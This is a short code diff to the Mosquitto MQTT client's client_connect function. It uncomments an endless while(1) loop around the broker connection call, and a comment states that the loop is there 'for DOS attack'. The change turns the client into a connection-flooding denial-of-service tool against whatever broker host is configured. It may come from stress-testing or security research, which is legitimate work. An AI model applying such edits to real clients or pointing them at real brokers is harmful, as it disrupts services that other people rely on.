@@ -1385,9 +1385,9 @@ int client_connect(struct mosquitto *mosq, struct mosq_config *cfg) {
     }
 #else
     // added while loop for DOS attack
-    //while (1) {
+    while (1) {
         rc = mosquitto_connect_bind_v5(mosq, cfg->host, port, cfg->keepalive, cfg->bind_address, cfg->connect_props);
-    //}
+    }
 #endif
     if (rc > 0) {
         if (rc == MOSQ_ERR_ERRNO) {
